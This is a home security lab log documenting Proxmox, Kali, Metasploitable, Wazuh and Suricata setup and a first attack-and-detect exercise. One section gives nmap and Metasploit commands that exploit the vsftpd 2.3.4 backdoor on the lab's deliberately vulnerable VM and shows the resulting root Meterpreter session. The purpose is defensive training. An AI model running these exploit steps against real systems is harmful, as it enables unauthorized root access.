# Session 02 — Aperture Setup + First Attack Exercise
**Date:** March 30, 2026  
**Machine:** Aperture (10.0.10.20)  
**Objective:** Deploy Proxmox, build Kali and Metasploitable VMs, deploy Wazuh agents, run first attack/detect cycle

---

## Table of Contents
1. [Hardware](#hardware)
2. [Phase 1 — Proxmox VE Installation](#phase-1--proxmox-ve-installation)
3. [Phase 2 — Repository Configuration](#phase-2--repository-configuration)
4. [Phase 3 — Static DHCP Bindings in TZ370](#phase-3--static-dhcp-bindings-in-tz370)
5. [Phase 4 — Kali Linux VM (ID 100)](#phase-4--kali-linux-vm-id-100)
6. [Phase 5 — Metasploitable VM (ID 101)](#phase-5--metasploitable-vm-id-101)
7. [Phase 6 — Wazuh Agent on Aperture](#phase-6--wazuh-agent-on-aperture)
8. [Phase 7 — Wazuh Agent on Kali](#phase-7--wazuh-agent-on-kali)
9. [Phase 8 — Suricata on Aperture (vmbr0)](#phase-8--suricata-on-aperture-vmbr0)
10. [First Attack Exercise](#first-attack-exercise)
11. [Session Status](#session-status)
12. [Lessons Learned](#lessons-learned)

---

## Hardware

- **Machine:** ThinkCentre M70Q
- **CPU:** i7-10700T
- **RAM:** 16GB DDR4
- **Storage:** 500GB WDC PC SN730 NVMe SSD (`/dev/nvme0n1`)
- **MAC:** 54:05:db:cb:47:76
- **IP:** 10.0.10.20

---

## Phase 1 — Proxmox VE Installation

**Installation steps:**
1. Downloaded Proxmox VE ISO from proxmox.com/downloads
2. Flashed to USB using Rufus (MBR, DD mode)
3. Booted Aperture from USB (F12 boot menu)
4. Selected Install Proxmox VE (Graphical)
5. Target disk: `/dev/nvme0n1` (476.94GB WDC PC SN730)
6. Network configuration:
   - Management Interface: nic0 — `54:05:db:cb:47:76`
   - Hostname: `aperture.local`
   - IP: `10.0.10.20/24`
   - Gateway: `10.0.10.1`
   - DNS: `8.8.8.8`
7. Install completed — accessed GUI at `https://10.0.10.20:8006`

> **Note:** Proxmox login requires selecting **Linux PAM standard authentication** realm — not PVE realm. Authentication fails silently if wrong realm is selected.

---

## Phase 2 — Repository Configuration

**Problem:** Proxmox enterprise repos require a paid subscription — caused 401 errors on `apt update`.

**Fix — Disable enterprise repos:**
```bash
mv /etc/apt/sources.list.d/ceph.sources /etc/apt/sources.list.d/ceph.sources.disabled
mv /etc/apt/sources.list.d/pve-enterprise.sources /etc/apt/sources.list.d/pve-enterprise.sources.disabled
```

**Fix — Add no-subscription repo:**
```bash
cat > /etc/apt/sources.list << 'EOF'
deb http://deb.debian.org/debian trixie main contrib
deb http://deb.debian.org/debian trixie-updates main contrib
deb http://security.debian.org/debian-security trixie-security main contrib
deb http://download.proxmox.com/debian/pve trixie pve-no-subscription
EOF
```

**Update system:**
```bash
apt update && apt upgrade -y
```

---

## Phase 3 — Static DHCP Bindings in TZ370

Added static DHCP bindings for both lab machines in TZ370 GUI:  
**Network → DHCP Server → Static Entries → Add**

| Name | MAC | IP |
|---|---|---|
| glados | 84:a9:38:7f:2e:50 | 10.0.10.10 |
| aperture | 54:05:db:cb:47:76 | 10.0.10.20 |

---

## Phase 4 — Kali Linux VM (ID 100)

### VM Settings
| Setting | Value |
|---|---|
| VM ID | 100 |
| Name | kali-linux |
| ISO | Kali Linux 64-bit Installer |
| Disk | 80GB (local-lvm) |
| CPU | 4 cores |
| RAM | 8192MB |
| Network | vmbr0 |

### Kali Install
1. Selected Graphical Install
2. Hostname: `kali`
3. Username: `watcher`
4. Partition: Guided — entire disk, all files in one partition
5. GRUB installed to `/dev/vda`
6. Install completed — rebooted into Kali desktop

### Post-install snapshot
```
Proxmox GUI → VM 100 → Snapshots → Take Snapshot
Name: clean-install
```
Use this to restore Kali to a clean state before any exercise.

---

## Phase 5 — Metasploitable VM (ID 101)

### VM Settings
| Setting | Value |
|---|---|
| VM ID | 101 |
| Name | metasploitable |
| CPU | 1 core |
| RAM | 512MB |
| Network | vmbr0 |

### VMDK Import Steps
```bash
# Upload VMDK from Windows PC to Aperture via SCP
scp "Metasploitable.vmdk" root@10.0.10.20:/root/

# Import VMDK into VM 101 (run in Proxmox shell)
qm importdisk 101 /root/Metasploitable.vmdk local-lvm
```

**After import in Proxmox GUI:**
1. VM 101 → Hardware → Unused Disk 0 → double click
2. Change Bus/Device to **IDE 0** (required — SCSI causes boot failure)
3. Click Add
4. VM 101 → Options → Boot Order → enable IDE disk, move to top
5. Start VM

> **Note:** Must use IDE bus — Metasploitable uses an old kernel that doesn't support VirtIO or SCSI. Boot will drop to initramfs shell if wrong bus is used.

### VM Details
- **Default credentials:** `msfadmin` / `msfadmin`
- **IP:** 10.0.10.106 (DHCP)

### Key vulnerabilities found by nmap
| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 (backdoored) |
| 22 | SSH | OpenSSH 4.7p1 |
| 23 | Telnet | Linux telnetd |
| 512 | exec | netkit-rsh rexecd |
| 1524 | bindshell | Metasploitable root shell |
| 3306 | MySQL | 5.0.51a |
| 5432 | PostgreSQL | 8.3.0 |
| 5900 | VNC | Protocol 3.3 |
| 6667 | IRC | UnrealIRCd |

---

## Phase 6 — Wazuh Agent on Aperture

> **Note:** The standard Wazuh install script (`wazuh-install.sh`) is blocked by TZ370 DPI-SSL — returns an XML Access Denied error. Use the APT repo method instead.

```bash
# Add GPG key
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH -o /tmp/wazuh.key
cat /tmp/wazuh.key | gpg --dearmor | tee /usr/share/keyrings/wazuh.gpg > /dev/null
chmod 644 /usr/share/keyrings/wazuh.gpg

# Add repository
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list

# Install agent
apt update
WAZUH_MANAGER='10.0.10.10' apt install wazuh-agent -y

# Enable and start
systemctl enable wazuh-agent
systemctl start wazuh-agent
systemctl status wazuh-agent
```

---

## Phase 7 — Wazuh Agent on Kali

Same APT repo method — run inside Kali terminal:

```bash
# Add GPG key
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH -o /tmp/wazuh.key
sudo mkdir -p /usr/share/keyrings
sudo chmod 755 /usr/share/keyrings
cat /tmp/wazuh.key | sudo gpg --dearmor | sudo tee /usr/share/keyrings/wazuh.gpg > /dev/null
sudo chmod 644 /usr/share/keyrings/wazuh.gpg

# Add repository
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list

# Install agent
sudo apt update
sudo WAZUH_MANAGER='10.0.10.10' apt install wazuh-agent -y

# Enable and start
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

Kali registered as **agent 002** in the Wazuh dashboard.

---

## Phase 8 — Suricata on Aperture (vmbr0)

VM-to-VM traffic stays entirely inside Proxmox's virtual bridge and never crosses GLaDOS. Suricata on GLaDOS cannot see it. Installing Suricata on Aperture watching `vmbr0` provides full visibility into attack traffic between VMs.

```bash
# Install Suricata
apt install suricata -y

# Update signatures
suricata-update

# Configure interface
sed -i 's/interface: eth0/interface: vmbr0/g' /etc/suricata/suricata.yaml

# Set HOME_NET
sed -i 's/HOME_NET: "\[192.168.0.0\/16,10.0.0.0\/8,172.16.0.0\/12\]"/HOME_NET: "[10.0.10.0\/24]"/g' /etc/suricata/suricata.yaml

# Enable and start
systemctl enable suricata
systemctl start suricata
systemctl status suricata
```

**Connect Suricata logs to Wazuh agent:**
```bash
tee -a /var/ossec/etc/ossec.conf << 'EOF'
<ossec_config>
  <localfile>
    <log_format>json</log_format>
    <location>/var/log/suricata/eve.json</location>
  </localfile>
</ossec_config>
EOF

# Fix permissions so Wazuh agent can read logs
chmod 644 /var/log/suricata/eve.json
chmod 755 /var/log/suricata

systemctl restart wazuh-agent
```

---

## First Attack Exercise

### Reconnaissance — nmap Scan

From Kali terminal:
```bash
nmap -sV -O 10.0.10.106
```

Suricata immediately detected Kali before the scan even completed:
```
ET INFO Possible Kali Linux hostname in DHCP Request Packet
Classification: Potential Corporate Privacy Violation
```

### Exploitation — vsftpd 2.3.4 Backdoor

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.10.106
set LHOST 10.0.10.148
set LPORT 4444
run
```

**Result:**
```
Backdoor service has been spawned
Meterpreter session opened (10.0.10.148:4444 → 10.0.10.106)
getuid → Server username: root
sysinfo → metasploitable.localdomain — Ubuntu Linux 2.6.24
```

### Detection — Wazuh Dashboard Results

- **445 total alerts** generated across all agents
- **MITRE ATT&CK techniques detected:**
  - T1021 — Remote Services
  - T1078 — Valid Accounts
  - T1562 — Disable or Modify Tools
  - T1548 — Sudo and Sudo Caching
  - T1110 — Password Guessing
- All 3 agents active and reporting — glados, aperture, kali

---

## Session Status

### Aperture (10.0.10.20)
| Service | Status |
|---|---|
| Proxmox VE | Running — https://10.0.10.20:8006 |
| Kali Linux VM (ID 100) | Running — clean-install snapshot taken |
| Metasploitable VM (ID 101) | Running — IP 10.0.10.106 |
| Wazuh Agent | Running — registered as agent 001 |
| Suricata (vmbr0) | Running — feeding into Wazuh agent |

### Kali (VM 100)
| Service | Status |
|---|---|
| Wazuh Agent | Running — registered as agent 002 |

### Wazuh Dashboard
- 3 active agents: glados, aperture, kali
- MITRE ATT&CK detections firing
- 445 alerts generated in first attack exercise

---

## Lessons Learned

- **Proxmox login realm matters** — must select Linux PAM, not PVE realm, or login silently fails
- **Proxmox enterprise repos require a subscription** — disable them and add the no-subscription (trixie) repo on fresh installs
- **Metasploitable must use IDE bus** — old kernel doesn't support VirtIO; boot drops to initramfs if SCSI/VirtIO is used
- **Wazuh install script blocked by TZ370 DPI-SSL** — use APT repo method for all agent installs
- **VM-to-VM traffic is invisible to GLaDOS** — Suricata on Aperture watching vmbr0 is required for IDS coverage inside Proxmox
- **Suricata log permissions matter** — Wazuh agent runs as a limited user and can't read `/var/log/suricata/eve.json` without explicit `chmod 644`
- **Kali advertises itself via DHCP hostname** — triggers Suricata ET rule before any active scanning begins

---

*Session completed: March 30, 2026*
